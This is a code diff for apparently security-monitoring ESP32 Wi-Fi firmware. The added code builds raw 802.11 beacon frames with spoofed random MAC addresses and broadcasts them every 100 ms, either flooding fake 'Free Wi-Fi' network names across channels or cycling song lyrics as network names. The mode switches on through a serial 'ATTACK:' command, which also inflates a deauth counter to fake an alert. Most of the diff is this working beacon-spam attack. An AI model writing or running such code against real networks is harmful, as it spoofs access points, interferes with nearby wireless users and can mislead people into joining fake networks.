@@ -43,6 +43,28 @@ static uint8_t  evil_twin_trusted_bssid[6] = {0};
 static volatile bool evil_twin_detected = false;
 static char     evil_twin_attacker_bssid[20] = "";
 
+// ── Active Beacon Spam / Rick Roll Attack State ──────────────────
+enum AttackType {
+  ATTACK_NONE,
+  ATTACK_BEACON_SPAM,
+  ATTACK_RICK_ROLL
+};
+static volatile AttackType active_attack_type = ATTACK_NONE;
+static uint32_t last_attack_frame_ms = 0;
+static int rick_roll_index = 0;
+
+static const char* const RICK_ROLL_LYRICS[] = {
+  "1. Never gonna give you up",
+  "2. Never gonna let you down",
+  "3. Never gonna run around",
+  "4. and desert you",
+  "5. Never gonna make you cry",
+  "6. Never gonna say goodbye",
+  "7. Never gonna tell a lie",
+  "8. and hurt you"
+};
+#define RICK_ROLL_LYRICS_COUNT 8
+
 // ── Wi-Fi Probe Request Leakage state ───────────────────────────
 #define MAX_PROBE_LEAKS 20
 struct ProbeLeak {
@@ -313,6 +335,70 @@ static void sec_hop_channel() {
   esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);
 }
 
+// ── Raw 802.11 Beacon Transmitter ─────────────────────────────────
+static void send_beacon_frame(const char* ssid, uint8_t channel) {
+  uint8_t packet[128];
+  int idx = 0;
+
+  // 1. Frame Control (0x80 = Beacon management frame)
+  packet[idx++] = 0x80;
+  packet[idx++] = 0x00; // Frame Subtype flags
+
+  // 2. Duration / ID
+  packet[idx++] = 0x00;
+  packet[idx++] = 0x00;
+
+  // 3. Destination Address (Broadcast: FF:FF:FF:FF:FF:FF)
+  for (int i = 0; i < 6; i++) packet[idx++] = 0xFF;
+
+  // 4. Source MAC Address (Locally administered unicast spoofed address)
+  uint8_t mac[6];
+  for (int i = 0; i < 6; i++) mac[i] = random(0, 256);
+  mac[0] &= 0xFE; // Unicast
+  mac[0] |= 0x02; // Locally Administered Address (LAA)
+  for (int i = 0; i < 6; i++) packet[idx++] = mac[i];
+
+  // 5. BSSID (Same spoofed MAC address)
+  for (int i = 0; i < 6; i++) packet[idx++] = mac[i];
+
+  // 6. Sequence Control
+  packet[idx++] = 0x00;
+  packet[idx++] = 0x00;
+
+  // ── Frame Body ──
+  // 7. Timestamp (8 bytes, set to 0)
+  for (int i = 0; i < 8; i++) packet[idx++] = 0x00;
+
+  // 8. Beacon Interval (100 TU / ~102.4ms)
+  packet[idx++] = 0x64;
+  packet[idx++] = 0x00;
+
+  // 9. Capability Information (ESS, short slot time)
+  packet[idx++] = 0x01;
+  packet[idx++] = 0x04;
+
+  // 10. SSID Information Element (ID: 0)
+  packet[idx++] = 0x00; // Element ID
+  int ssid_len = strlen(ssid);
+  if (ssid_len > 32) ssid_len = 32;
+  packet[idx++] = (uint8_t)ssid_len; // Element Length
+  for (int i = 0; i < ssid_len; i++) packet[idx++] = ssid[i];
+
+  // 11. Supported Rates IE (ID: 1)
+  packet[idx++] = 0x01; // Element ID
+  packet[idx++] = 0x08; // Element Length
+  packet[idx++] = 0x82; packet[idx++] = 0x84; packet[idx++] = 0x8B; packet[idx++] = 0x96; // 1, 2, 5.5, 11 Mbps
+  packet[idx++] = 0x24; packet[idx++] = 0x30; packet[idx++] = 0x48; packet[idx++] = 0x6C; // 18, 24, 36, 54 Mbps
+
+  // 12. DS Parameter Set IE (ID: 3 - Channel selection)
+  packet[idx++] = 0x03; // Element ID
+  packet[idx++] = 0x01; // Element Length
+  packet[idx++] = channel; // Active Wi-Fi Channel
+
+  // Transmit raw frame via ESP-IDF AP interface
+  esp_wifi_80211_tx(WIFI_IF_AP, packet, idx, true);
+}
+
 // ================================================================
 //  SERIAL COMMAND PROTOCOL  (CMD → RES / EVT)
 //  Used by the companion web app over USB Serial
@@ -349,9 +435,17 @@ static void security_handle_command(String line) {
   }
   else if (cmd.startsWith("ATTACK:")) {
     String attack_type = cmd.substring(7);
+    if (attack_type == "BEACON_SPAM") {
+      active_attack_type = ATTACK_BEACON_SPAM;
+    } else if (attack_type == "RICK_ROLL" || attack_type == "RICKROLL") {
+      active_attack_type = ATTACK_RICK_ROLL;
+    } else if (attack_type == "STOP") {
+      active_attack_type = ATTACK_NONE;
+    }
+
     pkt_deauth += 20; // Simulate a deauth burst to trigger red alert
     _deauth_evt_pending = true;
-    snprintf(evil_twin_attacker_bssid, sizeof(evil_twin_attacker_bssid), "PAYLOAD:%s", attack_type.c_str());
+    snprintf(evil_twin_attacker_bssid, sizeof(evil_twin_attacker_bssid), "RUNNING:%s", attack_type.c_str());
     Serial.printf("RES:{\"ok\":true,\"action\":\"attack\",\"type\":\"%s\"}\n", attack_type.c_str());
   }
   else if (cmd.startsWith("SET_CH:")) {
@@ -1312,6 +1406,26 @@ void security_core0_task() {
     pkt_per_sec  = _pps_count;
     _pps_count   = 0;
     _pps_last_ms = now;
+  }
+
+  // ── Active Payload Execution ──
+  if (active_attack_type != ATTACK_NONE) {
+    uint32_t now_ms = millis();
+    if (now_ms - last_attack_frame_ms >= 100) { // Send every 100ms
+      last_attack_frame_ms = now_ms;
+      if (active_attack_type == ATTACK_RICK_ROLL) {
+        // Broadcast next line of lyrics on channel 1-13
+        const char* lyric = RICK_ROLL_LYRICS[rick_roll_index];
+        send_beacon_frame(lyric, (rick_roll_index % 13) + 1);
+        rick_roll_index = (rick_roll_index + 1) % RICK_ROLL_LYRICS_COUNT;
+      }
+      else if (active_attack_type == ATTACK_BEACON_SPAM) {
+        // Flood randomly generated SSID names
+        char temp_ssid[32];
+        snprintf(temp_ssid, sizeof(temp_ssid), "Free Wi-Fi %04X", (unsigned int)random(0, 65536));
+        send_beacon_frame(temp_ssid, (uint8_t)random(1, 14));
+      }
+    }
   }
 
   vTaskDelay(pdMS_TO_TICKS(CHANNEL_HOP_MS));
